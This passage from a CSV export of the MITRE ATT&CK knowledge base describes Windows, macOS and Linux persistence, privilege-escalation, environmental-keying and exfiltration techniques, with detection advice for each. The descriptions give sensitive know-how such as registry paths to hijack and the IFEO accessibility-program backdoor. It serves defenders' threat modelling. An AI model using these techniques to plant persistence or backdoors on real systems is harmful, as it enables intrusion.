Utilizing these shims may allow an adversary to perform several malicious acts such as elevate privileges, install backdoors, disable defenses like Windows Defender, etc. (Citation: FireEye Application Shimming) Shims can also be abused to establish persistence by continuously being invoked by affected programs.",https://attack.mitre.org/techniques/T1546/011,24 January 2020,10 November 2020,enterprise-attack,1.0,"Persistence, Privilege Escalation","There are several public tools available that will detect shims that are currently available (Citation: Black Hat 2015 App Shim):

* Shim-Process-Scanner - checks memory of every running process for any shim flags
* Shim-Detector-Lite - detects installation of custom shim databases
* Shim-Guard - monitors registry for any shim installations
* ShimScanner - forensic tool to find active shims in memory
* ShimCacheMem - Volatility plug-in that pulls shim cache from memory (note: shims are only cached after reboot)

Monitor process execution for sdbinst.exe and command-line arguments for potential indications of application shim abuse.",Windows,"Command: Command Execution, File: File Modification, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,,Administrator,,,,,"(Citation: Proofpoint TA505 October 2019),(Citation: FOX-IT May 2016 Mofang),(Citation: FireEye FIN7 Shim Databases),(Citation: Trustwave Pillowmint June 2020),"
T1546.001,attack-pattern--98034fef-d9fb-4667-8dc4-2eab6231724c,Event Triggered Execution: Change Default File Association,"Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility.(Citation: Microsoft Change Default Programs)(Citation: Microsoft File Handlers)(Citation: Microsoft Assoc Oct 2017) Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.

System file associations are listed under <code>HKEY_CLASSES_ROOT\.[extension]</code>, for example <code>HKEY_CLASSES_ROOT\.txt</code>. The entries point to a handler for that extension located at <code>HKEY_CLASSES_ROOT\\[handler]</code>. The various commands are then listed as subkeys underneath the shell key at <code>HKEY_CLASSES_ROOT\\[handler]\shell\\[action]\command</code>. For example: 

* <code>HKEY_CLASSES_ROOT\txtfile\shell\open\command</code>
* <code>HKEY_CLASSES_ROOT\txtfile\shell\print\command</code>
* <code>HKEY_CLASSES_ROOT\txtfile\shell\printto\command</code>

The values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.(Citation: TrendMicro TROJ-FAKEAV OCT 2012)",https://attack.mitre.org/techniques/T1546/001,24 January 2020,30 March 2023,enterprise-attack,1.0,"Persistence, Privilege Escalation","Collect and analyze changes to Registry keys that associate file extensions to default applications for execution and correlate with unknown process launch activity or unusual file types for that process.

User file association preferences are stored under <code> [HKEY_CURRENT_USER]\Software\Microsoft\Windows\CurrentVersion\Explorer\FileExts</code> and override associations configured under <code>[HKEY_CLASSES_ROOT]</code>. Changes to a user's preference will occur under this entry's subkeys.

Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.",Windows,"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,"Stefan Kanthak; Travis Smith, Tripwire","Administrator, SYSTEM, User",,,,,"(Citation: Securelist Kimsuky Sept 2013),(Citation: GitHub SILENTTRINITY Modules July 2019),"
T1546.015,attack-pattern--bc0f5e80-91c0-4e04-9fbb-e4e332c85dae,Event Triggered Execution: Component Object Model Hijacking,"Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects. COM is a system within Windows to enable interaction between software components through the operating system.(Citation: Microsoft Component Object Model)  References to various COM objects are stored in the Registry. 

Adversaries can use the COM system to insert malicious code that can be executed in place of legitimate software through hijacking the COM references and relationships as a means for persistence. Hijacking a COM object requires a change in the Registry to replace a reference to a legitimate system component which may cause that component to not work when executed. When that system component is executed through normal system operation the adversary's code will be executed instead.(Citation: GDATA COM Hijacking) An adversary is likely to hijack objects that are used frequently enough to maintain a consistent level of persistence, but are unlikely to break noticeable functionality within the system as to avoid system instability that could lead to detection. ",https://attack.mitre.org/techniques/T1546/015,16 March 2020,21 April 2023,enterprise-attack,1.1,"Persistence, Privilege Escalation","There are opportunities to detect COM hijacking by searching for Registry references that have been replaced and through Registry operations (ex: [Reg](https://attack.mitre.org/software/S0075)) replacing known binary paths with unknown paths or otherwise malicious content. Even though some third-party applications define user COM objects, the presence of objects within HKEY_CURRENT_USER\Software\Classes\CLSID\ may be anomalous and should be investigated since user objects will be loaded prior to machine objects in HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\.(Citation: Elastic COM Hijacking) Registry entries for existing COM objects may change infrequently. When an entry with a known good path and binary is replaced or changed to an unusual value to point to an unknown binary in a new location, then it may indicate suspicious behavior and should be investigated.  

Likewise, if software DLL loads are collected and analyzed, any unusual DLL load that can be correlated with a COM object Registry modification may indicate COM hijacking has been performed. ",Windows,"Command: Command Execution, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,Elastic,User,,,,,"(Citation: ESET Zebrocy May 2019),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: HP SVCReady Jun 2022),(Citation: Talos Seduploader Oct 2017),(Citation: ESET Sednit Part 1),(Citation: Medium KONNI Jan 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Check Point Warzone Feb 2020),(Citation: ESET Sednit Part 2),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: NorthSec 2015 GData Uroburos Tools),(Citation: Kaspersky WIRTE November 2021),(Citation: Palo Alto Networks BBSRAT),"
T1546.014,attack-pattern--9c45eaa3-8604-4780-8988-b5074dbb9ecd,Event Triggered Execution: Emond,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by the Event Monitor Daemon (emond). Emond is a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) that accepts events from various services, runs them through a simple rules engine, and takes action. The emond binary at <code>/sbin/emond</code> will load any rules from the <code>/etc/emond.d/rules/</code> directory and take action once an explicitly defined event takes place.

The rule files are in the plist format and define the name, event type, and action to take. Some examples of event types include system startup and user authentication. Examples of actions are to run a system command or send an email. The emond service will not launch if there is no file present in the QueueDirectories path <code>/private/var/db/emondClients</code>, specified in the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) configuration file at<code>/System/Library/LaunchDaemons/com.apple.emond.plist</code>.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019)

Adversaries may abuse this service by writing a rule to execute commands when a defined event occurs, such as system start up or user authentication.(Citation: xorrior emond Jan 2018)(Citation: magnusviri emond Apr 2016)(Citation: sentinelone macos persist Jun 2019) Adversaries may also be able to escalate privileges from administrator to root as the emond service is executed with root privileges by the [Launch Daemon](https://attack.mitre.org/techniques/T1543/004) service.",https://attack.mitre.org/techniques/T1546/014,24 January 2020,20 April 2022,enterprise-attack,1.0,"Persistence, Privilege Escalation",Monitor emond rules creation by checking for files created or modified in <code>/etc/emond.d/rules/</code> and <code>/private/var/db/emondClients</code>.,macOS,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation",True,T1546,,Ivan Sinyakov,Administrator,,,,,","
T1546.012,attack-pattern--6d4a7fb3-5a24-42be-ae61-6728a2b581f6,Event Triggered Execution: Image File Execution Options Injection,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers. IFEOs enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application’s IFEO will be prepended to the application’s name, effectively launching the new process under the debugger (e.g., <code>C:\dbg\ntsd.exe -g  notepad.exe</code>). (Citation: Microsoft Dev Blog IFEO Mar 2010)

IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\SOFTWARE{\Wow6432Node}\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable></code> where <code>&lt;executable&gt;</code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)

IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IFEO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)

Similar to [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), on Windows Vista and later as well as Windows Server 2008 and later, a Registry key may be modified that configures ""cmd.exe,"" or another program that provides backdoor access, as a ""debugger"" for an accessibility program (ex: utilman.exe). After the Registry is modified, pressing the appropriate key combination at the login screen while at the keyboard or when connected with [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the ""debugger"" program to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may also be abused to obtain privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous triggered invocation.

Malware may also use IFEO to [Impair Defenses](https://attack.mitre.org/techniques/T1562) by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008)",https://attack.mitre.org/techniques/T1546/012,24 January 2020,10 November 2020,enterprise-attack,1.1,"Persistence, Privilege Escalation","Monitor for abnormal usage of the GFlags tool as well as common processes spawned under abnormal parents and/or with creation flags indicative of debugging such as <code>DEBUG_PROCESS</code> and <code>DEBUG_ONLY_THIS_PROCESS</code>. (Citation: Microsoft Dev Blog IFEO Mar 2010)

Monitor Registry values associated with IFEOs, as well as silent process exit monitoring, for modifications that do not correlate with known software, patch cycles, etc. Monitor and analyze application programming interface (API) calls that are indicative of Registry edits such as <code>RegCreateKeyEx</code> and <code>RegSetValueEx</code>. (Citation: Elastic Process Injection July 2017)",Windows,"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,"Oddvar Moe, @oddvarmoe","Administrator, SYSTEM",,,,,"(Citation: Proofpoint TA505 October 2019),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: FireEye TRITON 2019),"
T1546.016,attack-pattern--da051493-ae9c-4b1b-9760-c009c46c9b56,Event Triggered Execution: Installer Packages,"Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content. Installer packages are OS specific and contain the resources an operating system needs to install applications on a system. Installer packages can include scripts that run prior to installation as well as after installation is complete. Installer scripts may inherit elevated permissions when executed. Developers often use these scripts to prepare the environment for installation, check requirements, download dependencies, and remove files after installation.(Citation: Installer Package Scripting Rich Trouton)

Using legitimate applications, adversaries have distributed applications with modified installer scripts to execute malicious content. When a user installs the application, they may be required to grant administrative permissions to allow the installation. At the end of the installation process of the legitimate application, content such as macOS `postinstall` scripts can be executed with the inherited elevated permissions. Adversaries can use these scripts to execute a malicious executable or install other malicious components (such as a [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)) with the elevated permissions.(Citation: Application Bundle Manipulation Brandon Dalton)(Citation: wardle evilquest parti)

Depending on the distribution, Linux versions of package installer scripts are sometimes called maintainer scripts or post installation scripts. These scripts can include `preinst`, `postinst`, `prerm`, `postrm` scripts and run as root when executed.

For Windows, the Microsoft Installer services uses `.msi` files to manage the installing, updating, and uninstalling of applications. Adversaries have leveraged `Prebuild` and `Postbuild` events to run commands before or after a build when installing .msi files.(Citation: Windows AppleJeus GReAT)(Citation: Debian Manual Maintainer Scripts)",https://attack.mitre.org/techniques/T1546/016,27 September 2022,19 October 2022,enterprise-attack,1.0,"Persistence, Privilege Escalation",,"Linux, Windows, macOS","Command: Command Execution, File: File Creation, Process: Process Creation",True,T1546,,Brandon Dalton @PartyD0lphin,User,,,,root,"(Citation: ObjectiveSee AppleJeus 2019),"
T1546.006,attack-pattern--10ff21b9-5a01-4268-a1b5-3b55015f1847,Event Triggered Execution: LC_LOAD_DYLIB Addition,"Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.(Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.

Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.(Citation: Malware Persistence on OS X)",https://attack.mitre.org/techniques/T1546/006,24 January 2020,20 April 2022,enterprise-attack,1.0,"Persistence, Privilege Escalation",Monitor processes for those that may be used to modify binary headers. Monitor file systems for changes to application binaries and invalid checksums/signatures. Changes to binaries that do not line up with application updates or patches are also extremely suspicious.,macOS,"Command: Command Execution, File: File Metadata, File: File Modification, Module: Module Load, Process: Process Creation",True,T1546,,,User,,,,,","
T1546.007,attack-pattern--f63fe421-b1d1-45c0-b8a7-02cd16ff2bed,Event Triggered Execution: Netsh Helper DLL,"Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.(Citation: TechNet Netsh) The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\SOFTWARE\Microsoft\Netsh</code>.

Adversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.(Citation: Github Netsh Helper CS Beacon)(Citation: Demaske Netsh Persistence)",https://attack.mitre.org/techniques/T1546/007,24 January 2020,20 April 2022,enterprise-attack,1.0,"Persistence, Privilege Escalation",It is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the <code>HKLM\SOFTWARE\Microsoft\Netsh</code> registry key for any new or suspicious entries that do not correlate with known system files or benign software.(Citation: Demaske Netsh Persistence),Windows,"Command: Command Execution, Module: Module Load, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,"Matthew Demaske, Adaptforward","Administrator, SYSTEM",,,,,"(Citation: Demaske Netsh Persistence),"
T1546.013,attack-pattern--0f2c410d-d740-4ed9-abb1-b8f4a7faf6c3,Event Triggered Execution: PowerShell Profile,"Adversaries may gain persistence and elevate privileges by executing malicious content triggered by PowerShell profiles. A PowerShell profile  (<code>profile.ps1</code>) is a script that runs when [PowerShell](https://attack.mitre.org/techniques/T1059/001) starts and can be used as a logon script to customize user environments.

[PowerShell](https://attack.mitre.org/techniques/T1059/001) supports several profiles depending on the user or host program. For example, there can be different profiles for [PowerShell](https://attack.mitre.org/techniques/T1059/001) host programs such as the PowerShell console, PowerShell ISE or Visual Studio Code. An administrator can also configure a profile that applies to all users and host programs on the local computer. (Citation: Microsoft About Profiles) 

Adversaries may modify these profiles to include arbitrary commands, functions, modules, and/or [PowerShell](https://attack.mitre.org/techniques/T1059/001) drives to gain persistence. Every time a user opens a [PowerShell](https://attack.mitre.org/techniques/T1059/001) session the modified script will be executed unless the <code>-NoProfile</code> flag is used when it is launched. (Citation: ESET Turla PowerShell May 2019) 

An adversary may also be able to escalate privileges if a script in a PowerShell profile is loaded and executed by an account with higher privileges, such as a domain administrator. (Citation: Wits End and Shady PowerShell Profiles)",https://attack.mitre.org/techniques/T1546/013,24 January 2020,20 October 2023,enterprise-attack,1.1,"Persistence, Privilege Escalation","Locations where <code>profile.ps1</code> can be stored should be monitored for new profiles or modifications. (Citation: Malware Archaeology PowerShell Cheat Sheet)(Citation: Microsoft Profiles) Example profile locations (user defaults as well as program-specific) include:

* <code>$PsHome\Profile.ps1</code>
* <code>$PsHome\Microsoft.{HostProgram}_profile.ps1</code>
* <code>$Home\\\[My ]Documents\PowerShell\Profile.ps1</code>
* <code>$Home\\\[My ]Documents\PowerShell\Microsoft.{HostProgram}_profile.ps1</code>

Monitor abnormal PowerShell commands, unusual loading of PowerShell drives or modules, and/or execution of unknown programs.",Windows,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation",True,T1546,,"Allen DeRyke, ICE; Matt Green, @mgreen27","Administrator, User",,,,,"(Citation: ESET Turla PowerShell May 2019),"
T1546.002,attack-pattern--ce4b7013-640e-48a9-b501-d0025a95f4bf,Event Triggered Execution: Screensaver,"Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\Windows\System32\</code>, and <code>C:\Windows\sysWOW64\</code>  on 64-bit Windows systems, along with screensavers included with base Windows installations.

The following screensaver settings are stored in the Registry (<code>HKCU\Control Panel\Desktop\</code>) and could be manipulated to achieve persistence:

* <code>SCRNSAVE.exe</code> - set to malicious PE path
* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver
* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock
* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed

Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.(Citation: ESET Gazer Aug 2017)",https://attack.mitre.org/techniques/T1546/002,24 January 2020,28 July 2023,enterprise-attack,1.2,"Persistence, Privilege Escalation","Monitor process execution and command-line parameters of .scr files. Monitor changes to screensaver configuration changes in the Registry that may not correlate with typical user behavior.

Tools such as Sysinternals Autoruns can be used to detect changes to the screensaver binary path in the Registry. Suspicious paths and PE files may indicate outliers among legitimate screensavers in a network and should be investigated.",Windows,"Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation, Windows Registry: Windows Registry Key Modification",True,T1546,,Bartosz Jerzman,User,,,,,"(Citation: ESET Gazer Aug 2017),(Citation: TechNet Screensaver GP)"
T1546.005,attack-pattern--63220765-d418-44de-8fae-694b3912317d,Event Triggered Execution: Trap,"Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.

Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where ""command list"" will be executed when ""signals"" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements)",https://attack.mitre.org/techniques/T1546/005,24 January 2020,24 March 2020,enterprise-attack,1.0,"Persistence, Privilege Escalation","Trap commands must be registered for the shell or programs, so they appear in files. Monitoring files for suspicious or overly broad trap commands can narrow down suspicious behavior during an investigation. Monitor for suspicious processes executed through trap interrupts.","Linux, macOS","Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation",True,T1546,,,"Administrator, User",,,,,","
T1546.004,attack-pattern--b63a34e8-0a61-4c97-a23b-bf8a2ed812e2,Event Triggered Execution: Unix Shell Configuration Modification,"Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User [Unix Shell](https://attack.mitre.org/techniques/T1059/004)s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user’s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately. 

Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files.(Citation: intezer-kaiji-malware)(Citation: bencane blog bashrc) These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely.(Citation: anomali-rocke-tactics)(Citation: Linux manual bash invocation) Since the system only executes the first existing file in the listed order, adversaries have used <code>~/.bash_profile</code> to ensure execution. Adversaries have also leveraged the <code>~/.bashrc</code> file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.(Citation: Tsunami)(Citation: anomali-rocke-tactics)(Citation: anomali-linux-rabbit)(Citation: Magento) Some malware targets the termination of a program to trigger execution, adversaries can use the <code>~/.bash_logout</code> file to execute malicious commands at the end of a session. 

For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using <code>/etc/profile</code>, <code>/etc/zshenv</code>, <code>/etc/zprofile</code>, and <code>/etc/zlogin</code>.(Citation: ScriptingOSX zsh)(Citation: PersistentJXA_leopitt)(Citation: code_persistence_zsh)(Citation: macOS MS office sandbox escape) The login shell then configures the user environment with <code>~/.zprofile</code> and <code>~/.zlogin</code>. The interactive shell uses the <code>~/.zshrc</code> to configure the user environment. Upon exiting, <code>/etc/zlogout</code> and <code>~/.zlogout</code> are executed. For legacy programs, macOS executes <code>/etc/bashrc</code> on startup.",https://attack.mitre.org/techniques/T1546/004,24 January 2020,20 August 2021,enterprise-attack,2.1,"Persistence, Privilege Escalation","While users may customize their shell profile files, there are only certain types of commands that typically appear in these files. Monitor for abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network when user profiles are loaded during the login process.

Monitor for changes to <code>/etc/profile</code> and <code>/etc/profile.d</code>, these files should only be modified by system administrators. MacOS users can leverage Endpoint Security Framework file events monitoring these specific files.(Citation: ESF_filemonitor) 

For most Linux and macOS systems, a list of file paths for valid shell options available on a system are located in the <code>/etc/shells</code> file.
","Linux, macOS","Command: Command Execution, File: File Creation, File: File Modification, Process: Process Creation",True,T1546,,"Robert Wilson; Tony Lambert, Red Canary","Administrator, User",,,,,"(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Anomali Linux Rabbit 2018),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: RotaJakiro 2021 netlab360 analysis),"
T1546.003,attack-pattern--910906dd-8c0a-475a-9cc1-5e029e2fad58,Event Triggered Execution: Windows Management Instrumentation Event Subscription,"Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user loging, or the computer's uptime.(Citation: Mandiant M-Trends 2015)

Adversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system.(Citation: FireEye WMI SANS 2015)(Citation: FireEye WMI 2015) Adversaries may also compile WMI scripts into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.(Citation: Dell WMI Persistence)(Citation: Microsoft MOF May 2018)

WMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.",https://attack.mitre.org/techniques/T1546/003,24 January 2020,21 April 2023,enterprise-attack,1.3,"Persistence, Privilege Escalation","Monitor WMI event subscription entries, comparing current WMI event subscriptions to known good subscriptions for each host. Tools such as Sysinternals Autoruns may also be used to detect WMI changes that could be attempts at persistence.(Citation: TechNet Autoruns)(Citation: Medium Detecting WMI Persistence) Monitor for the creation of new WMI <code>EventFilter</code>, <code>EventConsumer</code>, and <code>FilterToConsumerBinding</code> events. Event ID 5861 is logged on Windows 10 systems when new <code>EventFilterToConsumerBinding</code> events are created.(Citation: Elastic - Hunting for Persistence Part 1)

Monitor processes and command-line arguments that can be used to register WMI persistence, such as the <code> Register-WmiEvent</code> [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlet, as well as those that result from the execution of subscriptions (i.e. spawning from the WmiPrvSe.exe WMI Provider Host process).(Citation: Microsoft Register-WmiEvent)",Windows,"Command: Command Execution, Process: Process Creation, WMI: WMI Creation",True,T1546,,"Brent Murphy, Elastic; David French, Elastic","Administrator, SYSTEM",,,,,"(Citation: Secureworks BRONZE PRESIDENT December 2019),(Citation: FireEye POSHSPY April 2017),(Citation: FireEye Periscope March 2018),(Citation: Mandiant No Easy Breach),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Bitdefender Sardonic Aug 2021),(Citation: Microsoft PLATINUM April 2016),(Citation: CrowdStrike StellarParticle January 2022),(Citation: GitHub PoshC2),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Microsoft 365 Defender Solorigate),(Citation: ESET Dukes October 2019),(Citation: Bitdefender FIN8 July 2021),(Citation: Microsoft Holmium June 2020),(Citation: ESET Turla PowerShell May 2019),(Citation: SentinelLabs Metador Sept 2022),(Citation: RedCanary Mockingbird May 2020),(Citation: BitDefender BADHATCH Mar 2021),(Citation: FireEye APT33 Guardrail),(Citation: FireEye WMI 2015),(Citation: win10_asr),(Citation: FireEye WMI 2015)"
T1480.001,attack-pattern--f244b8dd-af6c-4391-a497-fc03627ce995,Execution Guardrails: Environmental Keying,"Adversaries may environmentally key payloads or other features of malware to evade defenses and constraint execution to a specific target environment. Environmental keying uses cryptography to constrain execution or actions based on adversary supplied environment specific conditions that are expected to be present on the target. Environmental keying is an implementation of [Execution Guardrails](https://attack.mitre.org/techniques/T1480) that utilizes cryptographic techniques for deriving encryption/decryption keys from specific types of values in a given computing environment.(Citation: EK Clueless Agents)

Values can be derived from target-specific elements and used to generate a decryption key for an encrypted payload. Target-specific values can be derived from specific network shares, physical devices, software/software versions, files, joined AD domains, system time, and local/external IP addresses.(Citation: Kaspersky Gauss Whitepaper)(Citation: Proofpoint Router Malvertising)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware) By generating the decryption keys from target-specific environmental values, environmental keying can make sandbox detection, anti-virus detection, crowdsourcing of information, and reverse engineering difficult.(Citation: Kaspersky Gauss Whitepaper)(Citation: Ebowla: Genetic Malware) These difficulties can slow down the incident response process and help adversaries hide their tactics, techniques, and procedures (TTPs).

Similar to [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027), adversaries may use environmental keying to help protect their TTPs and evade detection. Environmental keying may be used to deliver an encrypted payload to the target that will use target-specific values to decrypt the payload before execution.(Citation: Kaspersky Gauss Whitepaper)(Citation: EK Impeding Malware Analysis)(Citation: Environmental Keyed HTA)(Citation: Ebowla: Genetic Malware)(Citation: Demiguise Guardrail Router Logo) By utilizing target-specific values to decrypt the payload the adversary can avoid packaging the decryption key with the payload or sending it over a potentially monitored network connection. Depending on the technique for gathering target-specific values, reverse engineering of the encrypted payload can be exceptionally difficult.(Citation: Kaspersky Gauss Whitepaper) This can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within.

Like other [Execution Guardrails](https://attack.mitre.org/techniques/T1480), environmental keying can be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. This activity is distinct from typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). While use of [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) may involve checking for known sandbox values and continuing with execution only if there is no match, the use of environmental keying will involve checking for an expected target-specific value that must match for decryption and subsequent execution to be successful.",https://attack.mitre.org/techniques/T1480/001,23 June 2020,04 May 2022,enterprise-attack,1.0,Defense Evasion,"Detecting the use of environmental keying may be difficult depending on the implementation. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of [Discovery](https://attack.mitre.org/tactics/TA0007), especially in a short period of time, may aid in detection.","Linux, Windows, macOS","Command: Command Execution, Process: Process Creation",True,T1480,"Anti-virus, Host Forensic Analysis, Signature-based Detection, Static File Analysis","Nick Carr, Mandiant",,,,,,"(Citation: Microsoft Actinium February 2022),(Citation: Novetta Winnti April 2015),(Citation: ESET InvisiMole June 2020),(Citation: Kaspersky Gauss Whitepaper),(Citation: Volexity InkySquid RokRAT August 2021),(Citation: Twitter ItsReallyNick APT41 EK),(Citation: Kaspersky Equation QA),"
T1048.002,attack-pattern--8e350c1d-ac79-4b5c-bd4e-7476d7e84ec5,Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. 

Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin. 

Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol. ",https://attack.mitre.org/techniques/T1048/002,15 March 2020,15 October 2021,enterprise-attack,1.1,Exfiltration,"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious.(Citation: University of Birmingham C2) ","Linux, Windows, macOS","Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow",True,T1048,,William Cain,,,,,,"(Citation: Volexity SolarWinds),(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021),(Citation: Rclone),(Citation: TechNet Firewall Design)"
